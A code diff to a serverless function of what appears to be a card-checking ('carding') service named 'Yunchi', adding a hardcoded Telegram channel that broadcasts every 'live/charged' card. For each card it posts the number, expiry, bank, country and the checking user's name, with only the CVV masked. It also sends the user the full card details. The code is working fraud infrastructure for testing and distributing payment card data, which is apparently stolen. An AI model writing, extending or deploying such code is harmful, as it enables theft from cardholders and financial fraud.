@@ -8,6 +8,7 @@ const corsHeaders = {
 
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
 const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";
+const LIVE_CARDS_CHANNEL_ID = "-1003762273256"; // Channel for broadcasting all live/charged cards
 const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
 const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
 const TENOR_API_KEY = Deno.env.get("TENOR_API_KEY");
@@ -416,11 +417,37 @@ ${brandEmoji} ${toFancyItalic(binInfo.brand)} • ${toFancyItalic(binInfo.type)}
 
 ${toFancyScript('Yunchi')} ⚡`.trim();
 
-    // Send notification with random anime GIF
-    const sent = await sendTelegramAnimation(profile.telegram_chat_id, randomGif, message);
+    // Build channel broadcast message (with masked CVV for security)
+    const maskedCard = `${cardNum}|${mm}|${yy}|***`;
+    const username = profile.username || 'Anonymous';
+    
+    const channelMessage = `🔥 ${toFancyBold(statusLabel + ' CARD')} 🔥
+
+${toFancyScript('Card')} ▸ <code>${maskedCard}</code>
+
+${statusLine}
+${brandEmoji} ${toFancyItalic(binInfo.brand)} • ${toFancyItalic(binInfo.type)}
+🏦 ${binInfo.bank}
+⭐ ${binInfo.level} • ${countryFlag} ${binInfo.country}
+
+⚡ ${gateway} • 👤 @${username}
+🕐 ${timeNow}
+
+${toFancyScript('Yunchi')} ⚡`.trim();
+
+    // Send notification to user with full card details and random anime GIF
+    const sentToUser = await sendTelegramAnimation(profile.telegram_chat_id, randomGif, message);
+    
+    // Broadcast to live cards channel (masked CVV)
+    console.log("[NOTIFY-CHARGED] Broadcasting to channel:", LIVE_CARDS_CHANNEL_ID);
+    const sentToChannel = await sendTelegramMessage(LIVE_CARDS_CHANNEL_ID, channelMessage);
 
     return new Response(
-      JSON.stringify({ success: sent }),
+      JSON.stringify({ 
+        success: sentToUser, 
+        channelBroadcast: sentToChannel,
+        channel: LIVE_CARDS_CHANNEL_ID 
+      }),
       { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
     );
 
